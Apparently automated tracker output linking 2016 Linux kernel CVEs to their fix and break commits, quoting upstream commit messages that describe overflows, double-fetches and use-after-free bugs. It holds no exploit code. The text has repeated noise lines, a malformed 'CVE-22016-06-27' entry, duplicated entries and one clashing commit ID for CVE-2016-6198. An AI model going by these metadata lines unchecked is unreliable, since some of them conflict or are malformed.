Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
